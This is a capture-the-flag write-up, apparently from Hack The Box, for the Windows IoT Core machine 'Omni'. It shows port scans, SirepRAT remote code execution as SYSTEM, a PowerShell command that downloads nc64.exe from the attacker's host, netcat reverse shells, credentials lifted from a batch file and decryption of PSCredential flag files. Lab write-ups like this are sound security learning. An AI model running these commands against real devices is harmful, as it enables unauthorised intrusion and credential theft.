@@ -1,0 +1,331 @@
+<blockquote>
+  <p>Omni is an unique machine running Windows IoT Core, a variant of Windows designed for embedded systems like Raspberry Pi. Using SirepRAT we are able to achieve remote code execution, thereby shell on the box. Later we discover credentials of two users, allowing us to login Windows Device Portal and obtain shell for each user where we decrypt the flags from user’s home directories.</p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/Spy0x7/Spy0x7.github.io/master/assets/Posts/Omni.png" alt="" /></p>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p>Starting off with <code class="language-plaintext highlighter-rouge">masscan</code> &amp; <code class="language-plaintext highlighter-rouge">nmap</code> we discover six open TCP ports 135, 8080, 5985, 29817, 29819, 29820:</p>
+
+<h4 id="masscan">masscan</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/omni
+→ masscan <span class="nt">-e</span> tun0 <span class="nt">-p1-65535</span> <span class="nt">--rate</span> 500 10.10.10.204 | <span class="nb">tee </span>masscan.ports
+
+Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-12-03 13:47:59 GMT
+ <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
+Initiating SYN Stealth Scan
+Scanning 1 hosts <span class="o">[</span>65535 ports/host]
+Discovered open port 5985/tcp on 10.10.10.204
+Discovered open port 29819/tcp on 10.10.10.204
+Discovered open port 29817/tcp on 10.10.10.204
+Discovered open port 8080/tcp on 10.10.10.204
+Discovered open port 135/tcp on 10.10.10.204
+Discovered open port 29820/tcp on 10.10.10.204
+
+cfx:  ~/Documents/htb/omni
+→ <span class="nb">cat </span>masscan.ports | <span class="nb">grep </span>tcp | <span class="nb">sed </span>s<span class="s1">'/Discovered open port //'</span> | <span class="nb">awk</span> <span class="nt">-F</span>/ <span class="s1">'{print $1}'</span> <span class="nv">ORS</span><span class="o">=</span><span class="s1">','</span>
+5985,29819,29820,29817,8080,135,
+
+</code></pre></div></div>
+
+<h4 id="nmap">nmap</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/omni
+→ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p5985</span>,29819,29820,29817,8080,135 10.10.10.204
+Nmap scan report <span class="k">for </span>10.10.10.204
+Host is up <span class="o">(</span>0.13s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE  VERSION
+135/tcp   open  msrpc    Microsoft Windows RPC
+5985/tcp  open  upnp     Microsoft IIS httpd
+8080/tcp  open  upnp     Microsoft IIS httpd
+| http-auth:
+| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
+|_  Basic <span class="nv">realm</span><span class="o">=</span>Windows Device Portal
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn<span class="s1">'t have a title.
+29817/tcp open  unknown
+29819/tcp open  arcserve ARCserve Discovery
+29820/tcp open  unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port29820-TCP:V=7.91%I=7%D=11/18%Time=5FB430D7%P=x86_64-pc-linux-gnu%r(
+SF:NULL,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(GenericLines,10,
+SF:"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(Help,10,"\*LY\xa5\xfb`\x
+SF:04G\xa9m\x1c\xc9}\xc8O\x12")%r(JavaRMI,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\
+SF:xc9}\xc8O\x12");
+Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 77.95 seconds
+</span></code></pre></div></div>
+
+<p>Port 135(RPC), 5895(WinRM), 8080(HTTP) seems familiar however 29817, 29819, 29820 are looked quite unusual at first glance.</p>
+
+<p>Although Nmap identifies it as Windows, turns out a Quick google search on HTTP banner <code class="language-plaintext highlighter-rouge">Windows Device Portal</code> leads us to this <a href="https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal"><strong>documentation</strong></a> which confirms it’s actually an Windows IoT Core.</p>
+
+<p>Further researching on Unknown ports 29817, 29819, 29820 leads us to various documents on SirepRAT and Windows IoT Core.</p>
+
+<h3 id="port-8080-http">Port 8080: HTTP</h3>
+
+<p>Visiting <a href="http://10.10.10.204:8080">http://10.10.10.204:8080</a> presents a login prompt for <strong>Windows Device Portal</strong>:</p>
+
+<p><img src="/assets/Omni/website.png" alt="website" /></p>
+
+<h2 id="sireprat">SirepRAT</h2>
+
+<p>Going forward with searching exploiting Windows IoT brings us to SirepRAT which utilizes Sirep Protocol on Port 29819/29820.</p>
+
+<p>For detailed explanation on SirepRAT we can refer this <a href="https://www.woprsummit.org/slides-archive/SirepRAT_RCEasSYSTEMonWindowsIoTCore-WOPRSummit.pdf"><strong>pdf</strong></a></p>
+
+<p>At the end of the pdf, it highlights SirepRAT Python exploit’s features which provide unauthenticated remote code execution as SYSTEM, exploit is available at their <a href="https://github.com/SafeBreach-Labs/SirepRAT"><strong>GitHub repo</strong></a></p>
+
+<h2 id="shell-as-omni">Shell as Omni</h2>
+
+<h3 id="testing-rce">Testing RCE</h3>
+
+<p>Referring Exploit’s usage to test and confirm arbitrary command execution as SYSTEM :</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/omni/SirepRAT  |master ?:2 ✗|
+→ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput <span class="nt">--return_output</span> <span class="nt">--cmd</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">--args</span> <span class="s2">" /c echo %username% "</span>
+&lt;HResultResult | <span class="nb">type</span>: 1, payload length: 4, HResult: 0x0&gt;
+&lt;OutputStreamResult | <span class="nb">type</span>: 11, payload length: 8, payload peek: <span class="s1">'omni$ '</span><span class="o">&gt;</span>
+&lt;ErrorStreamResult | <span class="nb">type</span>: 12, payload length: 4, payload peek: <span class="s1">''</span><span class="o">&gt;</span>
+
+cfx:  ~/Documents/htb/omni/SirepRAT  |master ?:2 ✗|
+→ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput <span class="nt">--return_output</span> <span class="nt">--cmd</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">--args</span> <span class="s2">" /c echo %userprofile% "</span>
+&lt;HResultResult | <span class="nb">type</span>: 1, payload length: 4, HResult: 0x0&gt;
+&lt;OutputStreamResult | <span class="nb">type</span>: 11, payload length: 23, payload peek: <span class="s1">'C:\Data\Users\System '</span><span class="o">&gt;</span>
+&lt;ErrorStreamResult | <span class="nb">type</span>: 12, payload length: 4, payload peek: <span class="s1">''</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Now that we have code execution, let’s upload <code class="language-plaintext highlighter-rouge">nc64.exe</code> on the box using <code class="language-plaintext highlighter-rouge">PowerShell iwr (Invoke-WebRequest)</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/omni/SirepRAT  |master ?:2 ✗|
+→ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput <span class="nt">--return_output</span> <span class="nt">--cmd</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">--args</span> <span class="s2">" /c powershell iwr -uri http://10.10.14.11/nc64.exe -o nc64.exe"</span> <span class="nt">--v</span>
+&lt;HResultResult | <span class="nb">type</span>: 1, payload length: 4, HResult: 0x0&gt;
+</code></pre></div></div>
+
+<p>Executing <code class="language-plaintext highlighter-rouge">nc64.exe</code> to return a reverse shell:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/omni/SirepRAT  |master ?:2 ✗|
+→ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput <span class="nt">--return_output</span> <span class="nt">--cmd</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">--args</span> <span class="s2">" /c nc64.exe -e powershell.exe 10.10.14.11 8020"</span> <span class="nt">--v</span>
+&lt;HResultResult | <span class="nb">type</span>: 1, payload length: 4, HResult: 0x0&gt;
+</code></pre></div></div>
+
+<p>Getting a call back on <code class="language-plaintext highlighter-rouge">nc</code> listener:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/omni/SirepRAT  |master ?:1 ✗|
+→ nc <span class="nt">-lvnp</span> 8020
+Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::8020
+Ncat: Listening on 0.0.0.0:8020
+Ncat: Connection from 10.10.10.204.
+Ncat: Connection from 10.10.10.204:49676.
+Windows PowerShell
+Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
+
+PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32&gt;
+
+PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32&gt; <span class="nv">$env</span>:username
+<span class="nv">$env</span>:username
+omni<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Apparently <code class="language-plaintext highlighter-rouge">whoami</code> is not available on the box but we can user other PowerShell command like <code class="language-plaintext highlighter-rouge">$env:username</code> to check the username which turns out to be <code class="language-plaintext highlighter-rouge">omni$</code></p>
+
+<h2 id="elevating-priv-omni---app">Elevating Priv: omni$ -&gt; app</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>To kick start the enumeration we can upload winPEAS.exe, but unfortunately it doesn’t work and throws error. However bat version of winPEAS does work, However uploading winPEAS.bat and running it on the box doesn’t give anything interesting.</p>
+
+<p>Next, we can try to manually search for files, a good approach is to search for bat files as they are usually used to automate stuff or run commands on timely basis like cron jobs.</p>
+
+<p>So we will make use of PowerShell command to recursively find bat files on the box. Here <code class="language-plaintext highlighter-rouge">gci</code> stands for Get-ChildItem, <code class="language-plaintext highlighter-rouge">-r</code> recursive and <code class="language-plaintext highlighter-rouge">-force</code> is used to locate hidden files.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\&gt;</span> gci <span class="nt">-r</span> <span class="nt">-force</span> <span class="sb">`</span><span class="k">*</span>.bat
+gci <span class="nt">-r</span> <span class="nt">-force</span> <span class="k">*</span>.bat
+
+
+    Directory: C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPowerShell<span class="se">\M</span>odules<span class="se">\P</span>ackageManagement
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a-h--</span>        8/21/2020  12:56 PM            247 r.bat
+
+
+    Directory: C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPowerShell<span class="se">\M</span>odules<span class="se">\P</span>ester<span class="se">\3</span>.4.0<span class="se">\b</span><span class="k">in
+
+
+</span>Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>       10/26/2018  11:36 PM            925 Pester.bat
+
+
+    Directory: C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPowerShell<span class="se">\M</span>odules<span class="se">\P</span>ester<span class="se">\3</span>.4.0
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>       10/26/2018  11:36 PM            744 Build.bat
+</code></pre></div></div>
+
+<p>Going through <code class="language-plaintext highlighter-rouge">r.bat</code> located at <code class="language-plaintext highlighter-rouge">C:\Program Files\WindowsPowerShell\Modules\PackageManagement</code> we discover credentials for app and administrator user:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPowerShell<span class="se">\M</span>odules<span class="se">\P</span>ackageManagement&gt; gci <span class="nt">-force</span>
+gci <span class="nt">-force</span>
+
+
+    Directory: C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPowerShell<span class="se">\M</span>odules<span class="se">\P</span>ackageManagement
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----       10/26/2018  11:37 PM                1.0.0.1
+<span class="nt">-a-h--</span>        8/21/2020  12:56 PM            247 r.bat
+
+
+PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPowerShell<span class="se">\M</span>odules<span class="se">\P</span>ackageManagement&gt; get-content r.bat
+get-content r.bat
+@echo off
+
+:LOOP
+
+<span class="k">for</span> /F <span class="s2">"skip=6"</span> %%i <span class="k">in</span> <span class="o">(</span><span class="s1">'net localgroup "administrators"'</span><span class="o">)</span> <span class="k">do </span>net localgroup <span class="s2">"administrators"</span> %%i /delete
+
+net user app mesh5143
+net user administrator _1nt3rn37ofTh1nGz
+
+ping <span class="nt">-n</span> 3 127.0.0.1
+
+cls
+
+GOTO :LOOP
+
+:EXIT
+</code></pre></div></div>
+
+<p>Creds:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">app:mesh5143</code></li>
+  <li><code class="language-plaintext highlighter-rouge">administrator:_1nt3rn37ofTh1nGz</code></li>
+</ul>
+
+<h3 id="shell">Shell</h3>
+
+<p>Both the creds allow us to login on Windows device portal running Port 8080, first we’ll login using <code class="language-plaintext highlighter-rouge">app</code> user creds. Once logged in Inside <code class="language-plaintext highlighter-rouge">Processes</code> tab we have <code class="language-plaintext highlighter-rouge">Run command</code> which allows us to run commands on the box.</p>
+
+<p>Since we have already uploaded <code class="language-plaintext highlighter-rouge">nc64.exe</code> on the box, we’ll use it to drop us a reverse shell as <code class="language-plaintext highlighter-rouge">app</code> user:</p>
+
+<p><img src="/assets/Omni/app.png" alt="app" /></p>
+
+<p>Getting a callback on <code class="language-plaintext highlighter-rouge">nc</code> listener:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/omni
+→ nc <span class="nt">-lvnp</span> 8050
+Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::8050
+Ncat: Listening on 0.0.0.0:8050
+Ncat: Connection from 10.10.10.204.
+Ncat: Connection from 10.10.10.204:49677.
+Windows PowerShell
+Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
+
+PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32&gt; <span class="nv">$env</span>:username
+<span class="nv">$env</span>:username
+app
+</code></pre></div></div>
+
+<p>Further enumeration reveals, Interestingly user directories are located inside <code class="language-plaintext highlighter-rouge">C:\Data\Users</code> on this box:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers&gt; <span class="nb">ls
+ls
+
+
+    </span>Directory: C:<span class="se">\D</span>ata<span class="se">\U</span>sers
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----         7/4/2020   9:48 PM                administrator
+d-----         7/4/2020   9:53 PM                app
+d-----         7/3/2020  11:22 PM                DefaultAccount
+d-----         7/3/2020  11:22 PM                DevToolsUser
+d-r---       11/17/2020   9:13 PM                Public
+d-----         7/4/2020  10:29 PM                System
+</code></pre></div></div>
+
+<h3 id="decrypt-usertxt">Decrypt user.txt</h3>
+
+<p>Trying to retrieve contents of user.txt, we receive the following:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; get-content user.txt
+get-content user.txt
+&lt;Objs <span class="nv">Version</span><span class="o">=</span><span class="s2">"1.1.0.1"</span> <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/powershell/2004/04"</span><span class="o">&gt;</span>
+  &lt;Obj <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
+    &lt;TN <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
+      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
+      &lt;T&gt;System.Object&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;S <span class="nv">N</span><span class="o">=</span><span class="s2">"UserName"</span><span class="o">&gt;</span>flag&lt;/S&gt;
+      &lt;SS <span class="nv">N</span><span class="o">=</span><span class="s2">"Password"</span><span class="o">&gt;</span>01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7&lt;/SS&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;
+</code></pre></div></div>
+
+<p>Turns out it’s an PSCredential encrypted file, while searching for decryption methods I came across this <a href="https://gist.github.com/vScripter/af37a068976e791ced1c29e0da8ce12b"><strong>GitHub gist</strong></a> with reference to line 55, We understand we can use <code class="language-plaintext highlighter-rouge">Import-CliXml</code> to decrypt the data:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; <span class="nv">$cfxuser</span> <span class="o">=</span> Import-CliXML <span class="nt">-Path</span> C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\u</span>ser.txt
+<span class="nv">$cfxuser</span> <span class="o">=</span> Import-CliXML <span class="nt">-Path</span> C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\u</span>ser.txt
+
+PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; <span class="nv">$cfxuser</span>.GetNetworkCredential<span class="o">()</span>.Password
+<span class="nv">$cfxuser</span>.GetNetworkCredential<span class="o">()</span>.Password
+7cfd50f6bc34db3204898f1505ad9d70
+
+</code></pre></div></div>
+
+<h2 id="elevating-priv-app---administrator">Elevating Priv app -&gt; administrator</h2>
+
+<p>Following the same process, we can login to Windows device portal and use Run command to get ourselves reverse shell as administrator:</p>
+
+<p><img src="/assets/Omni/admin.png" alt="admin" /></p>
+
+<h3 id="admin-shell">Admin Shell</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/omni
+→ nc <span class="nt">-lvnp</span> 8090
+Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::8090
+Ncat: Listening on 0.0.0.0:8090
+Ncat: Connection from 10.10.10.204.
+Ncat: Connection from 10.10.10.204:49678.
+Windows PowerShell
+Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
+
+PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32&gt; <span class="nv">$env</span>:username
+<span class="nv">$env</span>:username
+Administrator
+</code></pre></div></div>
+
+<h3 id="decrypt-roottxt">Decrypt root.txt</h3>
+
+<p>Apparently root.txt is also encrypted, we’ll again use <code class="language-plaintext highlighter-rouge">Import-CliXml</code> to decrypt the flag:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; <span class="nv">$cfxroot</span> <span class="o">=</span> Import-CliXML <span class="nt">-Path</span> C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\r</span>oot.txt
+<span class="nv">$cfxroot</span> <span class="o">=</span> Import-CliXML <span class="nt">-Path</span> C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\r</span>oot.txt
+
+PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; <span class="nv">$cfxroot</span>.GetNetworkCredential<span class="o">()</span>.Password
+<span class="nv">$cfxroot</span>.GetNetworkCredential<span class="o">()</span>.Password
+5dbdce5569e2c4708617c0ce6e9bf11d
+
+</code></pre></div></div>
+
+<p>And we pwned the Box !</p>
+
+<p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p>
